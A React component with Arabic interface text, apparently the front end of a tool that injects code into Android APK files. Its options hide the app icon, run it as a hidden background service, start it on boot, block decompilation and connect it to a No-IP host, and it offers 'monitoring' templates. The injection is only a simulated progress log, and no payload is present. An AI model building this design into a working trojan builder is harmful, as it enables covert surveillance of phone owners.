import React, { useState } from 'react';
import { FaUpload, FaPlug, FaMagic, FaServer, FaLock, FaCheck, FaExclamationTriangle, FaDownload } from 'react-icons/fa';

const ApkInjector = () => {
  const [selectedApk, setSelectedApk] = useState('');
  const [injectionMethod, setInjectionMethod] = useState('auto');
  const [injectionOptions, setInjectionOptions] = useState({
    preventCodeConversion: true,
    addNoIpConnection: true,
    hideAppIcon: false,
    stealthMode: false,
    autoStart: true,
  });
  const [injectionProgress, setInjectionProgress] = useState(0);
  const [isInjecting, setIsInjecting] = useState(false);
  const [injectionLog, setInjectionLog] = useState('');
  const [noIpSettings, setNoIpSettings] = useState({
    enabled: true,
    address: '',
    port: '8080',
    protocol: 'tcp',
    autoConnect: true,
  });
  // بيانات APKs المعدلة - سيتم استبدالها ببيانات حقيقية في الإنتاج
  const [injectedApks, setInjectedApks] = useState([]);

  const handleApkUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      setSelectedApk(file.name);
      setInjectionLog(`تم تحميل ملف APK: ${file.name}\n`);
    }
  };

  const handleInjection = () => {
    if (!selectedApk) {
      alert('الرجاء اختيار ملف APK أولاً');
      return;
    }

    setIsInjecting(true);
    setInjectionProgress(0);
    setInjectionLog('بدء عملية الحقن...\n');

    // محاكاة عملية الحقن
    const steps = [
      'فحص ملف APK...',
      'إعداد بيئة الحقن...',
      'حقن المكتبات...',
      'تعديل ملفات البيانات...',
      'إضافة خدمات الخلفية...',
      'توقيع التطبيق النهائي...',
      'اكتملت العملية!'
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length) {
        setInjectionLog(prev => prev + `${steps[currentStep]}\n`);
        setInjectionProgress(((currentStep + 1) / steps.length) * 100);
        currentStep++;
        
        // عند اكتمال العملية، قم بإضافة APK إلى القائمة
        if (currentStep === steps.length) {
          setTimeout(() => {
            // إضافة APK إلى قائمة APKs المعدلة
            const newApk = {
              id: Date.now(),
              name: selectedApk.replace('.apk', '') + '_modified',
              version: '1.0',
              date: new Date().toLocaleDateString('ar-SA'),
              size: '15.2 MB'
            };
            setInjectedApks(prev => [newApk, ...prev]);
          }, 1000);
        }
      } else {
        clearInterval(interval);
        setIsInjecting(false);
      }
    }, 1000);
  };

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold text-gray-800">حقن APK</h1>
        <div className="text-sm text-gray-500">آخر تحديث: {new Date().toLocaleDateString('ar-SA')}</div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* لوحة التحكم بالحقن */}
        <div className="lg:col-span-2 space-y-6">
          <div className="bg-white p-6 rounded-xl shadow">
            <h2 className="text-xl font-bold mb-4">رفع ملف APK</h2>
            <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
              <FaUpload className="mx-auto text-4xl text-gray-400 mb-4" />
              <p className="mb-2">اسحب ملف APK هنا أو انقر للاختيار</p>
              <input 
                type="file" 
                id="apk-upload" 
                className="hidden" 
                accept=".apk"
                onChange={handleApkUpload}
              />
              <label 
                htmlFor="apk-upload" 
                className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 cursor-pointer"
              >
                <FaUpload className="mr-2" /> اختيار ملف APK
              </label>
            </div>
            {selectedApk && (
              <div className="mt-4 p-4 bg-blue-50 rounded-lg">
                <div className="flex items-center">
                  <FaCheck className="text-green-500 mr-2" />
                  <span>تم اختيار الملف: {selectedApk}</span>
                </div>
              </div>
            )}
          </div>

          <div className="bg-white p-6 rounded-xl shadow">
            <h2 className="text-xl font-bold mb-4">طريقة الحقن</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div 
                className={`border rounded-lg p-4 cursor-pointer transition-colors ${
                  injectionMethod === 'auto' 
                    ? 'border-blue-500 bg-blue-50' 
                    : 'border-gray-200 hover:bg-gray-50'
                }`}
                onClick={() => setInjectionMethod('auto')}
              >
                <div className="flex items-center">
                  <FaMagic className="text-blue-500 mr-3 text-xl" />
                  <div>
                    <h3 className="font-medium">الحقن التلقائي</h3>
                    <p className="text-sm text-gray-500 mt-1">يقوم باختيار أفضل الخيارات تلقائياً</p>
                  </div>
                </div>
              </div>

              <div 
                className={`border rounded-lg p-4 cursor-pointer transition-colors ${
                  injectionMethod === 'manual' 
                    ? 'border-blue-500 bg-blue-50' 
                    : 'border-gray-200 hover:bg-gray-50'
                }`}
                onClick={() => setInjectionMethod('manual')}
              >
                <div className="flex items-center">
                  <FaPlug className="text-purple-500 mr-3 text-xl" />
                  <div>
                    <h3 className="font-medium">الحقن اليدوي</h3>
                    <p className="text-sm text-gray-500 mt-1">اختيار خيارات الحقن يدوياً</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-white p-6 rounded-xl shadow">
            <h2 className="text-xl font-bold mb-4">خيارات الحقن المتقدمة</h2>
            <div className="space-y-4">
              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center">
                  <FaLock className="text-yellow-500 mr-3" />
                  <div>
                    <h3 className="font-medium">منع التحويل البرمجي</h3>
                    <p className="text-sm text-gray-500">يمنع تحويل الكود إلى صيغة أخرى</p>
                  </div>
                </div>
                <label className="switch">
                  <input 
                    type="checkbox" 
                    checked={injectionOptions.preventCodeConversion}
                    onChange={(e) => setInjectionOptions({...injectionOptions, preventCodeConversion: e.target.checked})}
                  />
                  <span className="slider round"></span>
                </label>
              </div>

              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center">
                  <FaServer className="text-green-500 mr-3" />
                  <div>
                    <h3 className="font-medium">إضافة اتصال No-IP</h3>
                    <p className="text-sm text-gray-500">يسمح بالاتصال عبر عنوان No-IP</p>
                  </div>
                </div>
                <label className="switch">
                  <input 
                    type="checkbox" 
                    checked={injectionOptions.addNoIpConnection}
                    onChange={(e) => setInjectionOptions({...injectionOptions, addNoIpConnection: e.target.checked})}
                  />
                  <span className="slider round"></span>
                </label>
              </div>

              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center">
                  <FaExclamationTriangle className="text-red-500 mr-3" />
                  <div>
                    <h3 className="font-medium">إخفاء أيقونة التطبيق</h3>
                    <p className="text-sm text-gray-500">يخفي أيقونة التطبيق من الشاشة الرئيسية</p>
                  </div>
                </div>
                <label className="switch">
                  <input 
                    type="checkbox" 
                    checked={injectionOptions.hideAppIcon}
                    onChange={(e) => setInjectionOptions({...injectionOptions, hideAppIcon: e.target.checked})}
                  />
                  <span className="slider round"></span>
                </label>
              </div>

              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center">
                  <FaMagic className="text-purple-500 mr-3" />
                  <div>
                    <h3 className="font-medium">الوضع الخفي</h3>
                    <p className="text-sm text-gray-500">يعمل التطبيق كخدمة خلفية مخفية</p>
                  </div>
                </div>
                <label className="switch">
                  <input 
                    type="checkbox" 
                    checked={injectionOptions.stealthMode}
                    onChange={(e) => setInjectionOptions({...injectionOptions, stealthMode: e.target.checked})}
                  />
                  <span className="slider round"></span>
                </label>
              </div>

              <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                <div className="flex items-center">
                  <FaCheck className="text-blue-500 mr-3" />
                  <div>
                    <h3 className="font-medium">تشغيل تلقائي</h3>
                    <p className="text-sm text-gray-500">يبدأ التطبيق تلقائياً عند تشغيل الجهاز</p>
                  </div>
                </div>
                <label className="switch">
                  <input 
                    type="checkbox" 
                    checked={injectionOptions.autoStart}
                    onChange={(e) => setInjectionOptions({...injectionOptions, autoStart: e.target.checked})}
                  />
                  <span className="slider round"></span>
                </label>
              </div>
            </div>
          </div>

          {injectionOptions.addNoIpConnection && (
            <div className="bg-white p-6 rounded-xl shadow">
              <h2 className="text-xl font-bold mb-4">إعدادات No-IP</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">عنوان No-IP</label>
                  <input
                    type="text"
                    value={noIpSettings.address}
                    onChange={(e) => setNoIpSettings({...noIpSettings, address: e.target.value})}
                    className="form-control"
                    placeholder="yourdomain.no-ip.com"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">المنفذ</label>
                  <input
                    type="number"
                    value={noIpSettings.port}
                    onChange={(e) => setNoIpSettings({...noIpSettings, port: e.target.value})}
                    className="form-control"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">البروتوكول</label>
                  <select
                    value={noIpSettings.protocol}
                    onChange={(e) => setNoIpSettings({...noIpSettings, protocol: e.target.value})}
                    className="form-control"
                  >
                    <option value="tcp">TCP</option>
                    <option value="udp">UDP</option>
                    <option value="http">HTTP</option>
                    <option value="https">HTTPS</option>
                  </select>
                </div>
                <div className="flex items-center justify-between">
                  <span>الاتصال التلقائي عند التشغيل</span>
                  <label className="switch">
                    <input 
                      type="checkbox" 
                      checked={noIpSettings.autoConnect}
                      onChange={(e) => setNoIpSettings({...noIpSettings, autoConnect: e.target.checked})}
                    />
                    <span className="slider round"></span>
                  </label>
                </div>
              </div>
            </div>
          )}

          <div className="bg-white p-6 rounded-xl shadow">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold">بدء عملية الحقن</h2>
              <button
                onClick={handleInjection}
                disabled={isInjecting}
                className={`flex items-center px-4 py-2 rounded-md text-white font-medium ${
                  isInjecting ? 'bg-gray-400' : 'bg-blue-600 hover:bg-blue-700'
                }`}
              >
                {isInjecting ? (
                  <>
                    <span className="animate-spin mr-2">🔄</span> جاري الحقن...
                  </>
                ) : (
                  <>
                    <FaPlug className="mr-2" /> حقن APK
                  </>
                )}
              </button>
            </div>

            {injectionProgress > 0 && (
              <div className="mb-4">
                <div className="flex justify-between mb-1">
                  <span className="text-sm font-medium">تقدم الحقن</span>
                  <span className="text-sm font-medium">{Math.round(injectionProgress)}%</span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2.5">
                  <div 
                    className="bg-blue-600 h-2.5 rounded-full transition-all duration-300" 
                    style={{ width: `${injectionProgress}%` }}
                  ></div>
                </div>
              </div>
            )}

            {injectionLog && (
              <div>
                <h3 className="font-medium mb-2">سجل الحقن</h3>
                <pre className="bg-gray-800 text-green-400 p-4 rounded-lg overflow-auto max-h-60 text-sm">
                  {injectionLog}
                </pre>
              </div>
            )}
          </div>
        </div>

        {/* لوحة APKs المعدلة */}
        <div className="space-y-6">
          <div className="bg-white p-6 rounded-xl shadow">
            <h2 className="text-xl font-bold mb-4">APKs المعدلة مؤخراً</h2>
            <div className="space-y-4">
              {injectedApks.length > 0 ? (
                injectedApks.map((apk) => (
                  <div key={apk.id} className="border rounded-lg p-4 hover:bg-gray-50 cursor-pointer">
                    <div className="flex justify-between items-start">
                      <div>
                        <h3 className="font-medium">{apk.name}</h3>
                        <p className="text-sm text-gray-500">معدل بتاريخ {apk.date}</p>
                        <p className="text-xs text-gray-400 mt-1">حجم: {apk.size}</p>
                      </div>
                      <div className="flex space-x-2">
                        <button className="text-blue-600 hover:text-blue-800">
                          <FaDownload />
                        </button>
                        <button className="text-gray-600 hover:text-gray-800">
                          📋
                        </button>
                      </div>
                    </div>
                  </div>
                ))
              ) : (
                <p className="text-gray-500 text-center py-4">لا توجد APKs معدلة حتى الآن</p>
              )}
            </div>
          </div>

          <div className="bg-white p-6 rounded-xl shadow">
            <h2 className="text-xl font-bold mb-4">نماذج حقن جاهزة</h2>
            <div className="space-y-3">
              <button className="w-full text-left p-3 border rounded-lg hover:bg-gray-50">
                <h3 className="font-medium">نموذج حقن أساسي</h3>
                <p className="text-sm text-gray-500">حقن بسيط مع وظائف مراقبة أساسية</p>
              </button>

              <button className="w-full text-left p-3 border rounded-lg hover:bg-gray-50">
                <h3 className="font-medium">نموذج حقن متقدم</h3>
                <p className="text-sm text-gray-500">حقن كامل مع واجهة تحكم متقدمة</p>
              </button>

              <button className="w-full text-left p-3 border rounded-lg hover:bg-gray-50">
                <h3 className="font-medium">نموذج حقن خفي</h3>
                <p className="text-sm text-gray-500">حقن كامل مع إخفاء تام للتطبيق</p>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ApkInjector;